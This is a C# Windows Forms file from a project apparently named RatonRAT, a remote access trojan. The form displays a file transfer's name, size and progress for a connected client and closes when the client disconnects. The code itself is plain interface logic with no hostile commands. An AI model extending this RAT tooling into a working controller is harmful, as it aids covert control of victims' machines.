using Server.Connection;
using Stuff;
using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Windows.Forms;

namespace RatonRAT.ClientForms
{
    public partial class FormFile : Form
    {
        public SillyClient SillyClient { get; set; }
        public long FileSize { get; set; }
        public object OneByOne { get; set; }
        public long TotalFileSize { get; set; }
        public string FileName { get; set; }
        public string UID { get; set; }

        public FormFile()
        {
            InitializeComponent();
            OneByOne = new object();
        }

        public void CloseThis()
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new MethodInvoker(CloseThis));
            }
            else
            {
                this.Close();
            }
        }

        private void FormFile_Load(object sender, EventArgs e)
        {
            new RatonRAT.Classes.LightMode().Apply(this);
            timer1.Start();
            timer2.Start();
            this.Paint += Form_Paint;
            this.Region = new Region(CreateRoundPath(this.ClientRectangle, 25));
            progressBar1.Region = new Region(CreateRoundPath(this.ClientRectangle, 3));
        }

        private void Form_Paint(object sender, PaintEventArgs e)
        {
            if (!this.DesignMode)
            {
                using (Pen pen = new Pen(Color.White, 3))
                {
                    e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
                    e.Graphics.DrawPath(pen, CreateRoundPath(this.ClientRectangle, 25));
                }
            }
        }

        private static GraphicsPath CreateRoundPath(Rectangle rect, int radius)
        {
            GraphicsPath path = new GraphicsPath();
            path.AddArc(rect.X, rect.Y, radius, radius, 180, 90);
            path.AddArc(rect.Width - radius - 1, rect.Y, radius, radius, 270, 90);
            path.AddArc(rect.Width - radius - 1, rect.Height - radius - 1, radius, radius, 0, 90);
            path.AddArc(rect.X, rect.Height - radius - 1, radius, radius, 90, 90);
            path.CloseFigure();
            return path;
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            if (SillyClient == null || !SillyClient.isConnected())
            {
                this.Close();
            }
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            label1.Text = FileName;
            label4.Text = "File size: " + Helpers.BytesToString(FileSize);

            if (FileSize <= 0)
            {
                progressBar1.Value = 0;
                return;
            }

            float progress = (100f * TotalFileSize) / FileSize;

            if (float.IsNaN(progress) || float.IsInfinity(progress))
            {
                progress = 0;
            }

            int fds = Clamp((int)progress, 0, 100);

            progressBar1.Value = fds;
        }

        private int Clamp(int value, int min, int max)
        {
            return (value < min) ? min : (value > max) ? max : value;
        }


        public void Status(string status)
        {
            this.Invoke(new MethodInvoker(() => label3.Text = status));
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }
    }
}
